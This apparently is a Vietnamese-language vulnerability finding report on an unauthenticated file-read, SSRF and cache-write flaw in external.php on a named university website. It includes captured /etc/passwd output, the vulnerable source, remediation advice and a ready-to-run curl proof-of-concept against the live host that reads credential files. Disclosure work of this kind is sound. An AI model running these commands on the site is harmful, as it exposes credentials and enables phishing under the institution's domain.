external.php?__url= — đọc tệp tùy ý + ghi nội dung kiểm soát được vào cache phục vụ công khai (unauthenticated LFI/SSRF)
Severity: high (8.2)
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
Status: active
Assessment confidence: high
Target: https://www.uef.edu.vn
Method: GET
Fix effort: trivial
Created: 2026-11-06T02:58:43.049Z
Updated: 2026-11-06T02:58:43.049Z
Description
Tóm tắt: Endpoint công khai `GET /external.php?__url=` trên `https://www.uef.edu.vn` đưa thẳng tham số `__url` của người dùng vào `file_get_contents()` không có bất kỳ kiểm tra scheme/host/path nào. Nhờ các PHP stream wrapper, một người tấn công chưa xác thực có thể:
Đọc tệp tùy ý trên máy chủ (`file://`, `php://filter`) — bao gồm toàn bộ source code, cấu hình, và key file 2FA;
Ghi nội dung do mình chọn vào `_local/tmp/cache/external/EXTERNAL_CONTENTS_<md5(__url)>.cache` qua wrapper `data://` — tệp cache này được Apache phục vụ công khai qua URL `_local/tmp/cache/external/...` (HTTP 200, content-type rỗng);
SSRF HTTP nội bộ (wrapper `http://` hoạt động, đã fetch được `robots.txt` của chính site qua loopback/domain).
Lỗi này là mắt xích gốc của chuỗi khai thác hiện tại: mọi nguồn thu thập source/cấu hình/key file trong báo cáo này đều đi qua chính endpoint này.
Impact
Đã chứng minh (observed):
Đọc tùy ý mọi tệp httpd đọc được: `/etc/passwd` (1905 B), toàn bộ source CMS, `connection/connect.php`, `_local/config/local.php` (credential DB — xem báo cáo F3), key file 2FA (xem báo cáo F4). Tấn công unauthenticated, chỉ cần 1 GET.
Ghi nội dung tùy ý lên domain chính thức: tệp cache do attacker tạo được phục vụ công khai tại `https://www.uef.edu.vn/_local/tmp/cache/external/*.cache` → có thể dùng để hosting nội dung lừa đảo (phishing) dưới brand trường, poison cache các asset bên thứ ba trỏ về endpoint này.
SSRF HTTP nội bộ: fetch được HTTP từ trong mạng ra ngoài và tới chính site qua loopback.
Tiềm năng (chưa chứng minh trong phiên này): nếu tồn tại sink include/fetch thứ hai lấy đường dẫn từ route hoặc từ cache → chuỗi này chuyển thành RCE (xem mục severity_change_conditions). Không tuyên bố đã vượt ra ngoài quyền hạn httpd (không chứng minh root/host compromise).
Evidence
```
Capture 1 — đọc /etc/passwd (evidence_external_t2.txt, ngày 06/11/2026 02:32:16 GMT):

== T2: GET https://www.uef.edu.vn/external.php?__url=file:///etc/passwd (UA: Mozilla/5.0 (X11; Linux x86_64)) ==
HTTP/2 200 
date: Fri, 06 Nov 2026 02:32:16 GMT
server: Apache/2.4.37 (centos) OpenSSL/1.1.1k SVN/1.10.2
x-powered-by: PHP/7.4.33
expires: Sun, 06 Dec 2026 02:32:16 GMT
content-length: 1905
vary: Accept-Encoding
content-type: text/html;charset=UTF-8

-- body (first 300 bytes) --
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:

(body đầy đủ 1905 B lưu tại ext_t2.bin; xem tệp đính kèm evidence_external_t2.txt)

Capture 2 — chuỗi ghi cache qua data:// (evidence_f1_datawrite.txt, 06/11/2026):

== F1 chain: data:// cache write ==
REQ1: GET /external.php?__url=data://text/plain,UEF-F1-CACHEWRITE-MARKER-0611
-> 200, writes _local/tmp/cache/external/EXTERNAL_CONTENTS_4631009b7c63b2b8d10c2c7391b763fb.cache
REQ2: GET /external.php?__url=file:///var/www/uef.edu.vn/html/_local/tmp/cache/external/EXTERNAL_CONTENTS_4631009b7c63b2b8d10c2c7391b763fb.cache
-> 200 size=29 body:
UEF-F1-CACHEWRITE-MARKER-0611
REQ3: GET https://www.uef.edu.vn/_local/tmp/cache/external/EXTERNAL_CONTENTS_4631009b7c63b2b8d10c2c7391b763fb.cache directly -> HTTP 200, size=29 (file phuc vu cong khai)

Xác minh cục bộ (06/11/2026): md5("data://text/plain,UEF-F1-CACHEWRITE-MARKER-0611") = 4631009b7c63b2b8d10c2c7391b763fb — khớp chính xác tên tệp cache ghi trên server; datacache_read.bin (29 B, sha256 18d6c6dde58a275debc4ab019ea564920c45543fcbbedbdc0d49dba4fbb2295a) == đúng chuỗi marker.

Capture 3 — probe tcp:// (counterevidence, evidence_tcp_probe.txt / evidence_tcp_probe2.txt):
== tcp://127.0.0.1:2276   code=200 time=0.167335 size=0
== tcp://127.0.0.1:1      code=200 time=0.209080 size=0
== tcp://172.16.4.27:3306 code=200 time=0.166865 size=0
== tcp://115.78.229.127:3306 code=200 time=0.191359 size=0
== http://www.uef.edu.vn/robots.txt?cb=06111x code=200 time=0.199074 size=114
== tcp://127.0.0.1:80     code=200 time=0.145781 size=0
== http://127.0.0.1:2276/ code=200 time=0.190904 size=0
```
Technical analysis
Source đầy đủ của `external.php` (thu được qua chính `php://filter`, lưu tại `src_external.src`) cho thấy không có bất kỳ validation nào:
```php
$url = $GLOBAL_GET['__url'];                                   // dòng 8 — input thô từ GET
...
$filename = $dir_cache . $key . $ext;                          // dòng 19 — '_local/tmp/cache/external/EXTERNAL_CONTENTS_' . md5($url) . '.cache'
if( file_exists( $filename ) ) {
  $file_contents = file_get_contents( $filename );             // dòng 22
} else {
  $file_contents = file_get_contents( $url );                  // dòng 26 — wrapper tùy ý: file://, php://filter, data://, http(s)://
  file_put_contents( $filename, $file_contents );              // dòng 27 — ghi nội dung fetch vào cache phục vụ công khai
}
...
echo $file_contents;                                           // dòng 53
```
Điểm mấu chốt:
Dòng 26: `file_get_contents($url)` chấp nhận mọi PHP stream wrapper. `php://filter/read=convert.base64-encode/resource=...` biến endpoint thành LFI đáng tin cậy (đọc binary/PHP source không bị thực thi); `data://` biến endpoint thành cổng ghi nội dung tùy ý.
Dòng 19/27: tên tệp cache = `EXTERNAL_CONTENTS_` + `md5(__url)` — attacker không chọn tên tệp trực tiếp nhưng kiểm soát được nội dung và biết chính xác tên tệp (md5 xác định được). Thư mục ghi cố định `_local/tmp/cache/external/` nằm trong docroot.
Cache phục vụ công khai: Apache không chặn `_local/tmp/cache/` → tệp `.cache` trả 200 với content-type rỗng cho bất kỳ ai, không xác thực.
SSRF: wrapper `http://` hoạt động (fetch lại robots.txt của chính site); các probe `tcp://` (MySQL 172.16.4.27:3306, 115.78.229.127:3306, 127.0.0.1:2276, cổng 1, 80) đều trả 200/0 B tức thời (~0.15–0.2 s) — không lấy được banner; cơ chế (egress filter hoặc refusal) chưa xác định, chỉ ghi nhận quan sát: chỉ HTTP:80 cho kết quả có nội dung.
SELinux: `/sys/fs/selinux/enforce` = 0 (permissive), `httpd_can_network_connect` = "0 0" — không phải nguyên nhân chặn tcp probe.
Lỗi gốc là CWE-73 (External Control of File Path or Location) trên stream fetch, kèm CWE-918 (SSRF) từ cùng dòng.
Reproduction steps
Đọc tệp tùy ý (file://): `curl 'https://www.uef.edu.vn/external.php?__url=file:///etc/passwd'` → HTTP 200, 1905 B, nội dung `/etc/passwd` trả thẳng trong body.

Đọc bất kỳ tệp nào dưới dạng base64 (php://filter): `curl 'https://www.uef.edu.vn/external.php?__url=php://filter/read=convert.base64-encode/resource=/var/www/uef.edu.vn/html/connection/connect.php' | base64 -d` → source đầy đủ của tệp (kèm credential DB).
Ghi nội dung tùy ý (data://): `curl 'https://www.uef.edu.vn/external.php?__url=data://text/plain,UEF-F1-CACHEWRITE-MARKER-0611'` → HTTP 200; server ghi `_local/tmp/cache/external/EXTERNAL_CONTENTS_4631009b7c63b2b8d10c2c7391b763fb.cache` (4631009b… = md5("data://text/plain,UEF-F1-CACHEWRITE-MARKER-0611") — xác minh cục bộ).
Đọc lại qua chính LFI: `curl 'https://www.uef.edu.vn/external.php?__url=file:///var/www/uef.edu.vn/html/_local/tmp/cache/external/EXTERNAL_CONTENTS_4631009b7c63b2b8d10c2c7391b763fb.cache'` → 200, 29 B, đúng nội dung marker.
Cache được phục vụ công khai: `curl -I 'https://www.uef.edu.vn/_local/tmp/cache/external/EXTERNAL_CONTENTS_4631009b7c63b2b8d10c2c7391b763fb.cache'` → HTTP 200, 29 B, content-type rỗng.
Proof of concept
```
#!/bin/bash
# PoC F1 — external.php arbitrary read + controlled cache write (unauthenticated)
BASE='https://www.uef.edu.vn'
UA='Mozilla/5.0 (X11; Linux x86_64)'

# 1) Arbitrary file read via file://
echo '--- [1] file:///etc/passwd ---'
curl -sk -A "$UA" "$BASE/external.php?__url=file:///etc/passwd" | head -3

# 2) Read arbitrary source via php://filter (base64)
echo '--- [2] php://filter -> connection/connect.php ---'
curl -sk -A "$UA" "$BASE/external.php?__url=php://filter/read=convert.base64-encode/resource=/var/www/uef.edu.vn/html/connection/connect.php" | base64 -d

# 3) Controlled cache write via data:// (content is attacker-chosen)
MARK='UEF-F1-CACHEWRITE-MARKER-0611'
echo '--- [3] data:// cache write ---'
curl -sk -A "$UA" "$BASE/external.php?__url=data://text/plain,$MARK" -o /dev/null -w 'HTTP %{http_code}\n'
M=$(printf %s "data://text/plain,$MARK" | md5sum | cut -d' ' -f1)
echo "cache file: _local/tmp/cache/external/EXTERNAL_CONTENTS_$M.cache"

# 4) Read the cache back through the LFI itself
echo '--- [4] read back via file:// ---'
curl -sk -A "$UA" "$BASE/external.php?__url=file:///var/www/uef.edu.vn/html/_local/tmp/cache/external/EXTERNAL_CONTENTS_$M.cache"; echo

# 5) The same file is served publicly over HTTP
echo '--- [5] direct public URL ---'
curl -sk -A "$UA" -o /dev/null -w 'HTTP %{http_code} size=%{size_download}\n' "$BASE/_local/tmp/cache/external/EXTERNAL_CONTENTS_$M.cache"
```
Assumptions and prerequisites
httpd chạy dưới tài khoản có quyền đọc các tệp hệ thống/ứng dụng đã đọc (/etc/passwd, source, cấu hình, key file). Việc đọc các tệp root-only (ví dụ /etc/shadow) chưa được thử và chưa được giả định.
Thư mục _local/tmp/cache/external/ được phục vụ công khai qua HTTP (đã quan sát), và không bị chặn thêm bởi lớp .htaccess (AllowOverride None toàn cục theo httpd.conf).
Cơ chế khiến tcp:// trả rỗng tức thời chưa xác định (egress filter hay refusal); kết luận SSRF được giới hạn ở HTTP:80 dựa trên quan sát, không phải phân tích tường lửa.
Không giả định RCE từ bản thân F1: nội dung ghi được chỉ rơi vào pattern .cache trong thư mục cố định.
Confidence rationale
Cả ba hành vi (đọc tùy ý, ghi cache nội dung tùy ý, phục vụ công khai cache) đều được tái lập nhiều lần trong cùng phiên bằng PoC trực tiếp, kèm source code khớp từng dòng. Chỉ có cơ chế chặn tcp:// là chưa được giải thích, nhưng không ảnh hưởng tính xác thực của các hành vi chính.
Counterevidence
SSRF ngoài HTTP không hoạt động như banner-grab: 6 probe tcp:// (127.0.0.1:2276, 127.0.0.1:1, 127.0.0.1:80, 172.16.4.27:3306, 115.78.229.127:3306) đều 200/0 B tức thời — không thu được banner, không kết luận được cổng mở/đóng.
Ghi cache không cho phép kiểm soát tên/đường dẫn tệp ngoài pattern EXTERNAL_CONTENTS_<md5>.cache trong thư mục cố định; nội dung .cache không thực thi (php.conf chỉ map .php/.phar).
Đã thử LFI qua tham số route ($view/$res): $view lấy từ $GLOBALS['currentTemplate'], không điều khiển được từ request — không có sink include thứ hai qua router.
What would change severity
Nâng lên Critical (RCE): nếu tìm được sink include/require/fetch nhận đường dẫn ảnh hưởng từ request hoặc từ nội dung cache (ví dụ Smarty `fetch()` với template path điều khiển được) — chuỗi "ghi nội dung tùy ý + include" sẽ thành thực thi code.
Nâng Confidentiality nếu xác nhận đọc được tệp ngoài quyền httpd (root-only) — hiện chưa thử.
Giảm nếu chỉ giữ SSRF whitelist không ghi cache: còn lại SSRF nội bộ (giữ mức High do đọc tệp tùy ý vẫn tồn tại độc lập).
Remediation
Vô hiệu hóa hoặc thu hồi endpoint: xóa/đổi tên `external.php`, hoặc chặn truy cập công khai ngay tại Apache (`<Files external.php> Require all denied </Files>` — AllowOverride đang là None nên phải làm trong httpd.conf, .htaccess không hiệu lực).
Nếu vẫn cần chức năng: whitelist tuyệt đối scheme + host (chỉ cho phép `https://<miền tin cậy>`, từ chối `file://`, `php://`, `data://`, `ftp://`, `tcp://`, và IP nội bộ/loopback), kiểm tra bằng parse URL + so sánh resolved IP, và tắt `allow_url_include`/`allow_url_fopen` ở mức có thể.
Ghi cache: không ghi nội dung fetch về đĩa dưới dạng tệp phục vụ công khai; nếu bắt buộc, đặt ngoài docroot hoặc chặn serving `_local/tmp/cache/` trong httpd.conf, và xóa sạch các tệp `.cache` đã tồn tại (trong đó có các tệp PoC và nội dung do attacker tạo).
Kiểm tra log Apache các truy vấn `external.php?__url=` để xác định phạm vi dữ liệu đã bị đọc (tối thiểu: toàn bộ source + credential + key file 2FA) và rotate toàn bộ credential liên quan.
Evidence references
```
/tmp/uef_recon/evidence_external_t2.txt
/tmp/uef_recon/evidence_f1_datawrite.txt
/tmp/uef_recon/src_external.src
/tmp/uef_recon/datacache_read.bin
/tmp/uef_recon/ext_t2.bin
/tmp/uef_recon/evidence_tcp_probe.txt
/tmp/uef_recon/evidence_tcp_probe2.txt
```
